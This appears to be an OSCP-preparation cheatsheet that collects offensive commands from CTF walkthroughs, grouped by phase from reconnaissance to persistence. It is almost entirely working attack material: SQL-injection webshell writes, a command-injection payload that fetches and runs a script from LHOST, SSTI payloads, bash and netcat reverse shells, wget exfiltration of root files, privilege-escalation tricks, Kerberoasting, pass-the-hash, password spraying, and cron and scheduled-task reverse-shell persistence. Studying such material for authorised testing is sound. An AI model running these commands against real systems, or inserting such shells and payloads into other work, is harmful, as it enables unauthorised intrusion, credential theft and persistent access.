# Cheatsheet

Consolidated commands and techniques from all walkthroughs in this repository.
Grouped by attack phase, intended as a quick reference for OSCP preparation.

> All examples use placeholder credentials (`<PASSWORD>`, `<USER_FLAG>`, `<ROOT_FLAG>`).
> Replace with values from your own engagement.

---

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Web Exploitation](#3-web-exploitation)
- [4. Foothold](#4-foothold)
- [5. Linux Privilege Escalation](#5-linux-privilege-escalation)
- [6. Windows Privilege Escalation](#6-windows-privilege-escalation)
- [7. Active Directory](#7-active-directory)
- [8. Pivoting](#8-pivoting)
- [9. Credential Attacks](#9-credential-attacks)
- [10. Post-Exploitation](#10-post-exploitation)

---

## 1. Reconnaissance

### Port scanning

    nmap -sC -sV -p- --min-rate=5000 -T4 TARGET
    nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n TARGET -oA scans/quick
    nmap -sU --top-ports 50 TARGET

### Service enumeration

    showmount -e TARGET
    smbclient -L //TARGET/ -N
    enum4linux -a TARGET
    finger-user-enum.pl -u root -t TARGET

---

## 2. Web Enumeration

    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://TARGET/FUZZ -c
    gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
    ffuf -w wordlist.txt -u http://TARGET/FUZZ -e .php,.txt,.bak,.old,.zip
    ffuf -w subdomains.txt -u http://TARGET/ -H "Host: FUZZ.domain"

---

## 3. Web Exploitation

### SQL Injection - manual

    curl -s -G "http://TARGET/page.php" --data-urlencode "id=1 AND 1=1" | wc -c
    curl -s -G "http://TARGET/page.php" --data-urlencode "id=1 ORDER BY 7" | wc -c
    curl -s -G "http://TARGET/page.php" --data-urlencode "id=-1 UNION SELECT 1,version(),3,4,5,6,7-- -"

### INTO OUTFILE webshell

    0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e = <?php system($_GET["x"]); ?>

    curl -s -G "http://TARGET/page.php" --data-urlencode "id=-1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/x.php'-- -"

### LFI

    curl "http://TARGET/page.php?file=../../../../etc/passwd"
    curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php"

### Command injection

    Payload: test;curl${IFS}http://LHOST:7000/rev.sh|bash;

### SSTI

    {{7*7}}
    ${7*7}
    {{ config.__class__.__init__.__globals__["os"].popen("id").read() }}
    {{ ['/bin/bash','-c','cat /etc/passwd'].execute() }}

### File upload bypass

    echo 'GIF8; <?php system($_GET["cmd"]); ?>' > shell.php
    Content-Type: image/gif

---

## 4. Foothold

### Reverse shells

    bash -i >& /dev/tcp/LHOST/LPORT 0>&1

    echo -n 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64 -w0

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f

### Listeners

    nc -lvnp LPORT
    rlwrap nc -lvnp LPORT
    socat file:tty,raw,echo=0 tcp-listen:LPORT

### Shell stabilization

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    export SHELL=/bin/bash

### Payload delivery

    python3 -m http.server 8000
    impacket-smbserver share . -smb2support

    certutil -urlcache -split -f http://LHOST:8000/file.exe C:\Windows\Temp\file.exe

---

## 5. Linux Privilege Escalation

    ./linpeas.sh
    ./LinEnum.sh -t

    sudo -l
    find / -perm -4000 -type f 2>/dev/null
    getcap -r / 2>/dev/null
    crontab -l
    systemctl list-timers --all
    ss -tulpn
    find / -writable -type f 2>/dev/null | grep -v proc

### GTFOBins

    # tar wildcard injection
    cd /tmp && touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh shell.sh'
    sudo tar cf archive.tar *

    # wget
    sudo wget --post-file=/root/root.txt http://LHOST:8000/
    # WARNING: overwrites /etc/sudoers. Recovery-only in isolated lab.
    # In real engagement: out of scope - can brick the system.
    # sudo wget -O /etc/sudoers http://LHOST:8000/sudoers

    # ssh ProxyCommand
    sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' x

    # systemctl
    sudo systemctl link /tmp/root.service
    sudo systemctl start root.service

    # find
    sudo find / -exec /bin/sh \; -quit

### Cron exploitation

    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/script.sh
    /tmp/rootbash -p

### PATH injection (SUID)

    gcc setuid.c -o nvme
    export PATH=$(pwd):$PATH
    /opt/netdata/.../ndsudo nvme-list

### NFS no_root_squash

    showmount -e TARGET
    mount -t nfs TARGET:/share /mnt/nfs -o nolock
    cp /bin/bash /mnt/nfs/bash
    chmod +s /mnt/nfs/bash

---

## 6. Windows Privilege Escalation

    whoami /all
    whoami /priv
    systeminfo
    wmic service get name,displayname,pathname,startmode

    winpeas.exe
    Seatbelt.exe -group=all
    SharpUp.exe audit

### Token privileges

    SeImpersonatePrivilege -> GodPotato / PrintSpoofer / JuicyPotato
    SeBackupPrivilege -> robocopy /b SAM SYSTEM
    SeDebugPrivilege -> Mimikatz lsass dump

    GodPotato.exe -cmd "cmd /c whoami"
    PrintSpoofer.exe -i -c powershell

### Unquoted service path

    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

### Weak service permissions

    accesschk.exe -uwcqv "Authenticated Users" *
    sc config SERVICE binpath= "C:\Windows\Temp\shell.exe"

### MySQL UDF Hijacking

    SELECT @@plugin_dir;
    CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
    SELECT sys_eval('whoami');

---

## 7. Active Directory

    crackmapexec smb DC -u user -p pass --users
    crackmapexec smb DC -u user -p pass --shares
    bloodhound-python -u user -p pass -d domain -ns DC -c All
    ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=local'

### Kerberoasting

    GetUserSPNs.py domain/user:pass -dc-ip DC -request -outputfile hashes.txt
    hashcat -m 13100 hashes.txt rockyou.txt

### AS-REP Roasting

    GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC -format hashcat
    hashcat -m 18200 hashes.txt rockyou.txt

### Pass-the-Hash

    crackmapexec smb TARGET -u user -H NThash
    psexec.py domain/user@TARGET -hashes :NThash

---

## 8. Pivoting

### SSH tunneling

    ssh -L local_port:target_host:target_port user@pivot
    ssh -R remote_port:target_host:target_port user@pivot
    ssh -D 1080 user@pivot

### Chisel

    chisel server -p 8000 --reverse
    chisel client LHOST:8000 R:socks

### Ligolo-ng

    ligolo-proxy -selfcert -laddr 0.0.0.0:11601
    ligolo-agent -connect LHOST:11601 -ignore-cert

### proxychains

    # /etc/proxychains4.conf:
    socks5 127.0.0.1 1080

    proxychains4 nmap -sT -Pn -p 22,80,445 INTERNAL

---

## 9. Credential Attacks

### Hashcat modes

    -m 0      MD5
    -m 100    SHA-1
    -m 1400   SHA-256
    -m 3200   bcrypt
    -m 300    MySQL 4.1+
    -m 7400   SHA-256 crypt ($5$)
    -m 1000   NTLM
    -m 13100  Kerberoast
    -m 18200  AS-REP

    hashcat -m 3200 hashes.txt rockyou.txt

### John

    john --wordlist=rockyou.txt hashes.txt
    ssh2john id_rsa > hash.txt
    keepass2john database.kdbx > hash.txt
    zip2john file.zip > hash.txt

### Base64 multi-layer

    for i in $(seq 1 13); do cat file.txt | base64 -d > /tmp/step; mv /tmp/step file.txt; done

### Password spraying

    crackmapexec smb TARGET -u users.txt -p Password123 --continue-on-success
    hydra -L users.txt -P passwords.txt ssh://TARGET

---

## 10. Post-Exploitation

### File transfer

    nc -lvnp 8000 > file.txt
    cat file.txt > /dev/tcp/LHOST/8000

### Persistence

> **Scope:** Persistence is **not required** for HTB/OSCP (the box is yours). In real engagements, persistence is only allowed if explicitly authorized in the Rules of Engagement - otherwise it is out of scope.

**Linux:**

    echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"' | crontab -
    echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys

**Windows:**

    schtasks /create /tn "Updater" /tr "C:\Windows\Temp\shell.exe" /sc onlogon

### Cleanup

> **Scope:** Remove only **your own** artifacts (payloads, exploit scripts, temp files). Clearing logs/history is anti-forensics and out of scope.

**Remove your artifacts:**

    rm -rf /tmp/payloads/
    del C:\Windows\Temp\shell.exe

**What NOT to do (anti-forensics):**

    # history -c
    # rm -f ~/.bash_history
    # wevtutil cl System

---

## Quick reference - CVEs

| CVE | Target | Type |
|-----|--------|------|
| CVE-2015-8351 | Gwolle Guestbook 1.5.3 | RFI |
| CVE-2022-44268 | ImageMagick 7.1.0-49 | Arbitrary File Read |
| CVE-2022-4510 | Binwalk 2.3.2 | RCE |
| CVE-2023-32784 | KeePass 2.x < 2.54 | Password recovery |
| CVE-2023-41425 | WonderCMS 3.2.0 | XSS to RCE |
| CVE-2023-30547 | vm2 3.9.15 | Sandbox escape |
| CVE-2024-32019 | Netdata ndsudo | PATH injection |
| CVE-2025-24893 | XWiki 15.10.8 | Groovy RCE |
| CVE-2025-69212 | OpenSTAManager 2.9.8 | P7M injection |
| CVE-2026-31857 | Craft CMS 5.9.8 | Twig RCE |
| CVE-2026-34990 | CUPS 2.4.16 | LPE |

---

*For educational purposes only. Use only on machines you have permission to test.*
